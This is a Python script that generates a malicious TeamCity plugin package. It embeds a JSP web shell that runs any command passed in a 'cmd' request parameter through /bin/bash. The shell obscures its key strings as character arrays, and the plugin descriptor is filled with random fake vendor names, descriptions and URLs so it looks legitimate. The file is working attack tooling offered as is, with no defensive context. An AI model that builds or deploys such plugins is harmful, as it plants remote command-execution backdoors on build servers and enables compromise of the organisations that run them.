import zipfile
import string
import random

def GenerateRandomString(length):
    characters = string.ascii_letters + string.digits
    return "".join(random.choices(characters, k=length))

def GenerateRandomDescription():
    words = ['innovative', 'dynamic', 'cutting-edge', 'reliable', 'efficient', 'robust', 'scalable', 'next-gen', 'advanced', 'secure']
    return f"{random.choice(words)} solution for modern challenges."

def GenerateRandomCompanyName():
    company_prefix = ['Tech', 'Info', 'Data', 'Cloud', 'Secure', 'Cyber', 'Net', 'Dev', 'Global']
    company_suffix = ['Solutions', 'Systems', 'Networks', 'Technologies', 'Inc', 'Corp', 'LLC', 'Enterprises']
    return f"{random.choice(company_prefix)} {random.choice(company_suffix)}"

def GenerateRandomURL():
    domain_prefix = ['www', 'secure', 'app', 'portal', 'cloud']
    domain_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    domain_suffix = ['com', 'net', 'org', 'io', 'tech']
    return f"https://{random.choice(domain_prefix)}.{domain_name}.{random.choice(domain_suffix)}"

def GetEvilPluginZipFile(shell_file_content, plugin_name):
    # Generate random data
    random_description = GenerateRandomDescription()
    random_company_name = GenerateRandomCompanyName()
    random_url = GenerateRandomURL()
    
    zip_resources = zipfile.ZipFile(f"{plugin_name}.jar", "w")
    
    if shell_file_content == "":
        evil_plugin_jsp = r"""<%@ page pageEncoding="utf-8"%>
<%@ page import="java.util.Scanner" %>
<%
    String a=""; 
    String b=request.getParameter(new String(new char[]{'c','m','d'})); 
    ProcessBuilder c=new ProcessBuilder(new String(new char[]{'/','b','i','n','/','b','a','s','h'}),"-c",b); 
    Process d=c.start(); 
    Scanner e=new Scanner(d.getInputStream()).useDelimiter("\\A"); 
    a=e.hasNext()?e.next():a; 
    e.close();
%>
<%= a %>
"""
    else:
        evil_plugin_jsp = shell_file_content
    
    evil_plugin_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="urn:schemas-jetbrains-com:teamcity-plugin-v1-xml">
    <info>
        <name>{plugin_name}</name>
        <display-name>{plugin_name}</display-name>
        <description>{random_description}</description>
        <version>1.0</version>
        <vendor>
            <name>{random_company_name}</name>
            <url>{random_url}</url>
        </vendor>
    </info>
    <deployment use-separate-classloader="true" node-responsibilities-aware="true"/>
</teamcity-plugin>"""
    
    zip_resources.writestr(f"buildServerResources/{plugin_name}.jsp", evil_plugin_jsp)
    zip_resources.close()
    
    zip_plugin = zipfile.ZipFile(f"{plugin_name}.zip", "w")
    zip_plugin.write(filename=f"{plugin_name}.jar", arcname=f"server/{plugin_name}.jar")
    zip_plugin.writestr("teamcity-plugin.xml", evil_plugin_xml)
    zip_plugin.close()

if __name__ == "__main__":
    plugin_name = GenerateRandomString(8)
    shell_content = ""
    GetEvilPluginZipFile(shell_content, plugin_name)
    print(f"Plugin {plugin_name} created successfully.")
